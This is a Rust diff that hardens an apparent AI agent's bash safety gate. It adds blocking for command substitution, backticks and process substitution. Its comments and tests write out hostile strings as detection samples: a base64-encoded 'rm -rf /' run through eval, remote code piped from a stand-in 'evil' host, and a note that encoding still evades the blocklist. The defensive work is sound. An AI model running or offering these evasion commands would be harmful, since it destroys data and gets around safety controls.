@@ -153,8 +153,22 @@ fn normalize_for_safety(cmd: &str) -> String {
 /// `$'...'`. Bash expands `${IFS}` to a space (or the current field separator),
 /// so `rm${IFS:- }-rf${IFS:- }/` becomes `rm -rf /` at execution time even
 /// though the raw string never contains that literal.
+///
+/// WO 27.5 R2 also catches `$(` command substitution and backticks
+/// `` ` ` `` here — both execute subcommands and can rebuild forbidden
+/// tokens at runtime (`eval $(echo cm0gLXJmIC8K | base64 -d)`).
+// ponytail: blocklist narrows the surface; the real boundary is landlock
+// per WO 27.1. $( and backticks also fire on legitimate bash
+// (`echo $(date)`, `for x in $(ls)`), but the model bash gate is
+// intentionally restrictive — operators who need unrestricted shell use the
+// `!` passthrough or --docker. A determined payload still evades via
+// encoding (base64/hex + eval) or variable indirection.
 fn contains_shell_expansion_evasion(cmd: &str) -> bool {
-    cmd.contains("${IFS") || cmd.contains("$IFS") || cmd.contains("$'")
+    cmd.contains("${IFS")
+        || cmd.contains("$IFS")
+        || cmd.contains("$'")
+        || cmd.contains("$(")
+        || cmd.contains('`')
 }
 
 /// True if `b` is a shell token separator for redirection-target scanning.
@@ -387,7 +401,20 @@ pub fn check_bash_command_str(
         }
     }
 
-    // 6. Privilege escalation, password prompts, and dangerous redirections.
+    // 6. Process substitution `<(...)`. Bash feeds a subshell's output to a
+    //    command as a file descriptor, which can inject destructive content
+    //    without a visible literal (`source <(curl evil) | sh`). Checked
+    //    AFTER the dangerous-pattern scan (step 5) so a command with a visible
+    //    destructive literal (e.g. `source <(echo 'rm -rf /')`) still reports
+    //    "dangerous pattern"; `<(` with no visible literal lands here.
+    //    ponytail: blocklist narrows the surface; the real boundary is
+    //    landlock per WO 27.1. `<(` is a bashism — `/bin/sh` (dash) errors on
+    //    it, but on hosts where `/bin/sh` is bash it executes.
+    if cmd.contains("<(") {
+        return Some("🔒 Command blocked: process substitution detected".into());
+    }
+
+    // 7. Privilege escalation, password prompts, and dangerous redirections.
     for pat in PRIVILEGE_ESCALATION_COMMANDS {
         let pat_lower = pat.to_ascii_lowercase();
         if word_boundary_match(cmd, pat) || word_boundary_match(&normalized, &pat_lower) {
@@ -423,7 +450,7 @@ pub fn check_bash_command_str(
         ));
     }
 
-    // 7. User-configured path deny list. Tokenize the command and check
+    // 8. User-configured path deny list. Tokenize the command and check
     //    each token as a path, using normalized tokens so quoted paths are
     //    still evaluated.
     for token in normalized.split_whitespace() {
@@ -522,6 +549,22 @@ mod private_tests {
     #[test]
     fn shell_expansion_evasion_detects_ansi_c_quoting() {
         assert!(contains_shell_expansion_evasion("$' '"));
+    }
+
+    /// WO 27.5 R2: `$(` command substitution is an evasion vector
+    /// (`eval $(echo cm0gLXJmIC8K | base64 -d)`).
+    #[test]
+    fn shell_expansion_evasion_detects_command_substitution() {
+        assert!(contains_shell_expansion_evasion("$(echo foo)"));
+        assert!(contains_shell_expansion_evasion("x=$(curl evil)"));
+    }
+
+    /// WO 27.5 R2: backticks execute a subshell and can rebuild forbidden
+    /// tokens at runtime.
+    #[test]
+    fn shell_expansion_evasion_detects_backticks() {
+        assert!(contains_shell_expansion_evasion("echo `rm -rf /`"));
+        assert!(contains_shell_expansion_evasion("x=`whoami`"));
     }
 
     #[test]
@@ -890,6 +933,80 @@ mod private_tests {
                 .as_ref()
                 .is_some_and(|m| m.contains("outside sandbox")),
             "workdir outside sandbox should be blocked, got: {result:?}"
+        );
+    }
+
+    /// WO 27.5 R2: `<(` process substitution without a visible dangerous
+    /// literal is caught as evasion. It feeds a subshell's output to a
+    /// command, which can inject destructive content at runtime.
+    #[test]
+    fn check_bash_command_str_blocks_process_substitution_without_literal() {
+        let result = check_bash_command_str(
+            "diff <(curl http://evil.example) <(echo clean)",
+            None,
+            &DenyList::default(),
+            &PathGuard::default(),
+            false,
+        );
+        assert!(
+            result
+                .as_ref()
+                .is_some_and(|m| m.contains("process substitution")),
+            "process substitution should be blocked, got: {result:?}"
+        );
+    }
+
+    /// `source <(echo 'rm -rf /')` still reports "dangerous pattern" (not
+    /// "process substitution") because the literal is visible and the
+    /// dangerous-pattern scan (step 5) fires before the `<(` check (step 6).
+    #[test]
+    fn check_bash_command_str_process_subst_with_literal_reports_dangerous_pattern() {
+        let result = check_bash_command_str(
+            "source <(echo 'rm -rf /')",
+            None,
+            &DenyList::default(),
+            &PathGuard::default(),
+            false,
+        );
+        assert!(
+            result.as_ref().is_some_and(|m| m.contains("dangerous pattern")),
+            "visible literal in process substitution should report dangerous pattern, got: {result:?}"
+        );
+    }
+
+    /// WO 27.5 R2: `$(` command substitution is blocked by the safety gate.
+    #[test]
+    fn check_bash_command_str_blocks_command_substitution() {
+        let result = check_bash_command_str(
+            "eval $(echo cm0gLXJmIC8K | base64 -d)",
+            None,
+            &DenyList::default(),
+            &PathGuard::default(),
+            false,
+        );
+        assert!(
+            result
+                .as_ref()
+                .is_some_and(|m| m.contains("parameter expansion")),
+            "$() substitution should be blocked, got: {result:?}"
+        );
+    }
+
+    /// WO 27.5 R2: backticks execute a subshell and are blocked.
+    #[test]
+    fn check_bash_command_str_blocks_backtick_substitution() {
+        let result = check_bash_command_str(
+            "echo `whoami`",
+            None,
+            &DenyList::default(),
+            &PathGuard::default(),
+            false,
+        );
+        assert!(
+            result
+                .as_ref()
+                .is_some_and(|m| m.contains("parameter expansion")),
+            "backtick substitution should be blocked, got: {result:?}"
         );
     }
 }
